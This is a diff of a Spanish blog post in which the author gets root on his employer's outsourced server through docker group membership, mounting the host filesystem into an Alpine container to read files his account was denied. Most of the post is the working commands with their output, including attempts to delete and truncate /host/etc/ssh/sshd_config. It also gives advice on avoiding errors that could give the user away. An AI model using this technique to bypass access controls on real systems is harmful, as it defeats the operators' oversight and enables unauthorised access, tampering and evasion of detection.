@@ -53,18 +53,13 @@
 </p>
 
 <p>Según el paradigma de externalización de mi empresa, todos los sistemas son gestionados por un tercero, a base de cambios. Por petición mia, tengo un usuario nominal de SSH y puedo entrar a mirar logs y configuraciones, pero no todas. Lo que no saben es que puedo hacer de todo.</p>
-
 <p>El otro día intenté mirar una configuración de sistema (concretamente el <code>/etc/ssh/sshd_config</code>) para ver si había una configuración específica de enjaulado de los usuarios, puesto que se trata de un SFTP público.</p>
-
 <pre><code class="language-bash">gerard@atlantis:/etc/ssh$ cat sshd_config
 cat: sshd_config: Permiso denegado
 gerard@atlantis:/etc/ssh$
 </code></pre>
-
 <p>No se quien es el paranoico que pidió estos permisos, pero me toca pasar por el aro; o bien solicito que me lo pasen, o bien pido permisos de <em>sudo</em> o similar. Pero hay una manera que no va a tardar días, y que los técnicos que lo llevan no han controlado: el servidor tiene <strong>docker</strong> instalado, y mi usuario pertenece al grupo.</p>
-
 <p>Eso me permite ejecutar un contenedor con el <em>uid</em> que yo quiera, siendo el <em>uid</em> por defecto el &ldquo;0&rdquo; que es el usuario <strong>root</strong>.</p>
-
 <pre><code class="language-bash">gerard@atlantis:~$ docker run -ti --rm -u 70 alpine:3.8
 / $ grep 70 /etc/passwd
 postgres:x:70:70::/var/lib/postgresql:/bin/sh
@@ -74,11 +69,8 @@ postgres
 uid=70(postgres) gid=70(postgres)
 / $
 </code></pre>
-
 <p><strong>NOTA</strong>: La traducción entre el <em>uid</em> &ldquo;70&rdquo; y el usuario &ldquo;postgres&rdquo; se hace en base al fichero <code>/etc/passwd</code> <strong>del contenedor</strong>.</p>
-
 <p>Solo nos queda montar el sistema de ficheros del servidor en una carpeta cualquiera como un volumen y así puedo ver y modificar lo que ya quiera.</p>
-
 <pre><code class="language-bash">gerard@atlantis:~$ docker run -ti --rm -v /:/host alpine:3.8
 / # whoami
 root
@@ -90,9 +82,7 @@ root
 ...
 / #
 </code></pre>
-
 <p>Si solo pretendéis ver, montad el volúmen con la opción <em>readonly</em>, y os váis a evitar elgún error que os pueda delatar. Sin embargo, si váis a hacer modificaciones meditadas y conscientes, adelante.</p>
-
 <pre><code class="language-bash">gerard@atlantis:~$ docker run -ti --rm -v /:/host:ro alpine:3.8
 / # whoami
 root
@@ -105,7 +95,6 @@ rm: can't remove '/host/etc/ssh/sshd_config': Read-only file system
 truncate: /host/etc/ssh/sshd_config: open: Read-only file system
 / #
 </code></pre>
-
 <p>Recordad que lo que hagáis a partir de aquí queda bajo vuestra propia responsabilidad&hellip; Sed cautos</p>
 
 <div id="disqus_thread"></div>
